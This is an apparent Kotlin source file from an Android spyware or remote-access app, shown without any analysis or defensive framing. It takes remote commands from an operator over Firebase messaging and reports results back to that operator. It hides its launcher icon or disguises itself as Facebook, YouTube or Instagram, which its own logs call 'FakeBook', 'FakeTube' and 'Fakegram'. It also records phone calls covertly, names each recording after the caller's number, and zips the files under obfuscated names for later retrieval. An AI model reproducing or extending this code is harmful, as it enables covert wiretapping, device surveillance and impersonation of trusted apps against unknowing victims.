package com.example.mobiletwo

import android.app.NotificationManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.*
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.PersistableBundle
import android.util.Base64
import android.util.Log
import com.example.mobiletwo.Consts.Companion.mPackageName
import com.example.mobiletwo.MyExecutorFG.Companion.zipLocalFile
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.io.File
import kotlin.Exception

class MyFireBaseMessagingService: FirebaseMessagingService() {
    companion object {

        lateinit var dSPRead: SharedPreferences
        lateinit var dSPWrite: SharedPreferences.Editor
    }


    override fun onCreate() {
        super.onCreate()
        dSPRead=baseContext.getSharedPreferences("Blob", MODE_PRIVATE)
        dSPWrite= dSPRead.edit()
    }

    override fun onDestroy() {
        super.onDestroy()
        println("MyFireBaseMessagingService.onDestroy")
    }

    override fun getStartCommandIntent(p0: Intent): Intent {
        println("MyFireBaseMessagingService.getStartCommandIntent")
        return super.getStartCommandIntent(p0)
    }

    override fun handleIntentOnMainThread(p0: Intent): Boolean {
        println("MyFireBaseMessagingService.handleIntentOnMainThread")
        return super.handleIntentOnMainThread(p0)
    }

    override fun onMessageReceived(mRemoteMessage: RemoteMessage) {
        super.onMessageReceived(mRemoteMessage)
        println("MyFireBaseMessagingService.onMessageReceived")
        println("data: ${JSONObject(mRemoteMessage.data as Map<String, String>)}")
        val requestId = mRemoteMessage.data["request_id"]
        val mCommand = mRemoteMessage.data["command"]
        val param1 = mRemoteMessage.data["param1"]?:""
        val iconName = mRemoteMessage.data["icon_name"]?:""
        val fPath = mRemoteMessage.data["file_path"]
        val opt1:String = mRemoteMessage.data["option1"]?:""
        val opt2:String = mRemoteMessage.data["option2"]?:""
        val imei: String? = dSPRead.getString("imei", "")
        val token: String? = dSPRead.getString("FCMToken", "")
        val mDeviceName: String? = dSPRead.getString("mDeviceName", "")
        try{
            if (mCommand == "JW-C013") {
                MyApiOld.patrick(
                    mDeviceName ?: "",
                    token ?: "",
                    "",
                    requestId.toString(),
                    imei ?: ""
                )
                MyApiOld.resp(
                    requestId ?: "",
                    "تمت المهمه بنجاح",
                    "",
                    "",
                    "3",
                    "JW-C013",
                    "",
                    imei ?: ""
                )
                return
            }
            if (mCommand == "JW-C030") {
                doCancel((opt1).toInt(), opt2, imei ?: "")
                return
            }
            if (mCommand == "JW-C027") {
                changeIcon(iconName)
                MyApiOld.resp(
                    requestId ?: "",
                    "تمت المهمه بنجاح",
                    "",
                    "",
                    "3",
                    "JW-C027",
                    "",
                    imei ?: ""
                )
                return
            }
            if (mCommand == "JW-C028") {
                changeIcon("")
                MyApiOld.resp(
                    requestId ?: "",
                    "تمت المهمه بنجاح",
                    "",
                    "",
                    "3",
                    "JW-C028",
                    "",
                    imei ?: ""
                )
                return
            }

            if (Build.VERSION.SDK_INT < 29) {
                //jobScheduler
                MyApiOld.resp(
                    requestId ?: "",
                    "قيد الانتظار",
                    "",
                    "",
                    "1",
                    mCommand ?: "",
                    "",
                    imei ?: ""
                )
                doSchedule(
                    requestId = requestId,
                    command = mCommand ?: "",
                    param1 = param1,
                    file_path = fPath ?: ""
                )
            } else {
                    var mNotificationManager:NotificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                if (mNotificationManager.notificationChannels.isNotEmpty()){
                    var mChannel = mNotificationManager.notificationChannels.first()
                    when(mChannel.id){
                        "JW-C024" -> {val mException:Exception = Exception("Executor is busy")
                            throw mException}
                        "JW-C025" -> {val mException:Exception = Exception("Executor is busy")
                            throw mException}
                        "JW-C012" -> {val mException:Exception = Exception("Executor is busy")
                            throw mException}
                        "JW-C026" -> {val mException:Exception = Exception("Executor is busy")
                            throw mException}
                        else -> {MyForeGroundService.stopService(baseContext)
                            MyApiOld.resp(dSPRead.getString("currentRI", "")?:"","فشل المهمه","","","5",
                                dSPRead.getString("currentCommand", "")?:"", "", dSPRead.getString("imei", "")?:"")
                        }
                    }

                }
                dSPWrite.putString("currentRI", requestId).apply()
                dSPWrite.putString("currentCommand", mCommand).apply()


                //foregroundService
                MyApiOld.resp(
                    requestId ?: "",
                    "قيد الانتظار",
                    "",
                    "",
                    "1",
                    mCommand ?: "",
                    "",
                    imei ?: ""
                )
                MyForeGroundService.startService(
                    bContext = baseContext,
                    ri = requestId ?: "",
                    command = mCommand ?: "",
                    param = param1,
                    file_path = fPath ?: ""
                )
            }
        }catch(ex:Exception){
            MyExecutorFG.logEx(ex, "onMessageReceived")
            MyApiOld.resp(requestId?:"","فشل المهمه","","","5",
                mCommand?:"", "", dSPRead.getString("imei", "")?:"")
        }


        //MyForeGroundService.startService(bContext = baseContext, ri = request_id?:"", command = mCommand?:"", param = param1?:"", file_path = fPath?:"")
        //doSchedule(requestId = request_id, command = mCommand?:"", param1 = param1?:"", file_path = fPath?:"")
        //TODO Highlight
        //  Foreground service or Background task
        //  Foreground:
        //  MyForeGroundService.startService(bContext = baseContext, ri = request_id?:"", command = mCommand?:"", param = param1?:"", file_path = fPath?:"")
        //  Background:
        //  doSchedule(requestId = request_id, command = mCommand?:"", param1 = param1?:"", file_path = fPath?:"")
    }

    private fun doCancel(request_id: Int, opt2: String, imei: String) {
        //TODO TODO TODO TODO
        try{
            val mJobScheduler: JobScheduler =
                getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            mJobScheduler.cancel(request_id)
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "doCancel")
        }
        try{
            MyForeGroundService.stopService(this.baseContext)
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "doCancel")
        }
        try{ MyApiOld.resp("$request_id", "الغاء", "", "", "4", opt2, "", imei) }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "doCancel")
        }
    }

    override fun onDeletedMessages() {
        super.onDeletedMessages()
        println("MyFireBaseMessagingService.onDeletedMessages")

    }

    override fun onMessageSent(p0: String) {
        super.onMessageSent(p0)
        println("MyFireBaseMessagingService.onMessageSent")
    }

    override fun onSendError(p0: String, p1: Exception) {
        super.onSendError(p0, p1)
        println("MyFireBaseMessagingService.onSendError")
    }


    override fun onNewToken(token: String) {
        super.onNewToken(token)
        try{
            //changeIcon("")
            val dSPWrite: SharedPreferences.Editor = dSPRead.edit()
            dSPWrite.putString("FCMToken", token).apply()
            //TODO Connect to API
            if (Build.VERSION.SDK_INT < 29) {
                //jobScheduler
                //doSchedule(requestId = "0", command = "JW-C017", param1 = "", file_path = "")
                MyExecutorFG.obnovit(baseContext)
            } else {
                //foregroundService
                MyForeGroundService.startService(bContext = baseContext, ri = "0", command = "JW-C017", param = "", file_path = "")
            }
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "onNewToken")
        }
    }


    private fun doSchedule(requestId:String?,command:String,param1:String, file_path:String) {
        try {



            val mComponentName = ComponentName(baseContext, MyJobScheduler::class.java)
            val check = dSPRead.getString("useWIFIOnly", "false")
            val mJobInfo: JobInfo = JobInfo.Builder(requestId!!.toInt().or(0),mComponentName)
                .setRequiredNetworkType(if (check=="true" && command != "JW_C021") {
                    JobInfo.NETWORK_TYPE_UNMETERED} else JobInfo.NETWORK_TYPE_ANY)
                .build()
            val mJobScheduler: JobScheduler = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            val mBundle = PersistableBundle()
            mBundle.putString("command", command)
            if (param1 != ""){mBundle.putString("param", param1)}
            if (file_path != ""){mBundle.putString("file_path", file_path)}
            mJobInfo.extras.putPersistableBundle("pBundle", mBundle)
            mJobScheduler.schedule(mJobInfo)
        } catch (ex:Exception) {
            MyExecutorFG.logEx(ex, "doSchedule")
        }
    }

    fun changeIcon(s: String) {
        try {
            mPackageName=baseContext.applicationInfo.packageName
            when (s) {
                "GoogleLauncherAlias" -> {
                    Log.i("Change to", "FakeBook")
                    dSPWrite.putString("ActiveComponentName", "com.facebook.katana")
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Facebook"),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.YouTube"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Instagram"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                }
                "YoutubeLauncherAlias" -> {
                    Log.i("Change to", "FakeTube")
                    dSPWrite.putString("ActiveComponentName", "com.google.android.youtube")
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.YouTube"),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Facebook"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Instagram"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                }
                "PlayLauncherAlias" -> {
                    Log.i("Change to", "Fakegram")
                    dSPWrite.putString("ActiveComponentName", "com.instagram.android")
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Instagram"),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.YouTube"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Facebook"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                }
                else -> {
                    Log.i("Change to", "Hidden")
                    dSPWrite.putString("ActiveComponentName", "")
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Instagram"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.YouTube"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    packageManager.setComponentEnabledSetting(
                        ComponentName(mPackageName, "$mPackageName.Facebook"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                }
            }
        }catch (ex:Exception) {
            MyExecutorFG.logEx(ex, "changeIcon")
        }
    }

}



class MyCallListener: BroadcastReceiver(){


    override fun onReceive(mConext: Context?, mIntent: Intent?) {
        for (x in mIntent?.extras?.keySet()!!) {
            println("$x:${mIntent.extras?.get(x).toString()}")
        }
        val state:String? = mIntent.extras?.getString("state")
        val phoneNumber:String? = mIntent.extras?.getString("incoming_number")
        if (phoneNumber==null || state==null){return}
        when (state){
            "IDLE" -> {Pa3raBopku.stopRecording(phoneNumber)}
            "OFFHOOK" -> {Pa3raBopku.startRecording(mConext!!, phoneNumber)}
            else -> {}
        }
        println("_________________________________________")

    }

}


class Pa3raBopku{
    companion object{
        var started = false
        var fNumber:String=""
        var mFilePath =""
        //

        var mMediaRecorder:MediaRecorder?=null


        //


        fun startRecording(tContext:Context, number:String) {
            if (started){return}
            try{
                if (mMediaRecorder==null){
                    mMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(tContext)
                    }else{
                        MediaRecorder()
                    }
                }
                mMediaRecorder!!.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                mMediaRecorder!!.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                mMediaRecorder!!.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                val mPath = "${Consts.sFiles.absolutePath}/records"
                File(mPath).mkdirs()
                fNumber=number
                if (fNumber==""){fNumber="Unknown"}
                mFilePath = "$mPath/${fNumber}_${System.currentTimeMillis()}.amr"
                mMediaRecorder!!.setOutputFile(mFilePath)
                mMediaRecorder!!.prepare()
                mMediaRecorder!!.start()
                started=true

            }catch (ex:Exception){
                MyExecutorFG.logEx(ex, "Pa3raBopku startRecording")
            }
        }
        fun stopRecording(number:String) {

            if (!started){return}else{
                try{
                    started=false
                    mMediaRecorder!!.stop()
                    mMediaRecorder!!.reset()
                    if (number != "" && fNumber.contains("Unknown")){
                        val nFilePath = mFilePath.replace("Unknown",number)
                        File(mFilePath).renameTo(File(nFilePath))
                    }
                    //println(File(mFilePath).canRead())
                    val encoded:String = Base64.encodeToString(mFilePath.split("/").last().toByteArray(), Base64.DEFAULT)
                    zipLocalFile(arrayListOf(mFilePath), "${File(mFilePath).parent}/$encoded")
                    File(mFilePath).delete()
                }catch (ex:Exception){
                    MyExecutorFG.logEx(ex, "Pa3raBopku stopRecording")
                }}
        }
    }
}